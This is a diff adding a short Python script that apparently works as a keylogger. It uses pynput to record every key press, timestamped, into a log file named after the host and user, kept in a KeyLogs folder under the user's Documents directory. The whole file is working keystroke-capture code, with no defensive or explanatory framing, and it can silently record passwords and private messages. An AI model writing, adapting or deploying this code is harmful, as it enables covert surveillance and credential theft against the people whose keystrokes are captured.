@@ -1,0 +1,26 @@
+from pynput.keyboard import Listener
+import logging, datetime, getpass, socket, os
+
+date = datetime.datetime.now()
+
+username = getpass.getuser()                        # Get Logged On username
+hostname = socket.gethostname()                     # Get hostname
+
+dir = "C:/Users/%s/Documents/KeyLogs/" % username   # Log file directory
+
+if not os.path.exists(dir):                         # If folder doesn`t exist, folder will be created
+    os.mkdir(dir)
+
+# Append user input to file
+
+logging.basicConfig(filename=(dir + '%s_%s_%s.txt' % (hostname, username, date.strftime('%d_%B_%Y'))),
+                    level=logging.DEBUG,
+                    format='%(asctime)s: %(message)s')
+
+def on_press(key):      # Function for logging pressed keys
+    logging.info(key)
+
+with Listener(on_press=on_press) as listener:       # Add pressed keys to listener
+    listener.join()
+
+
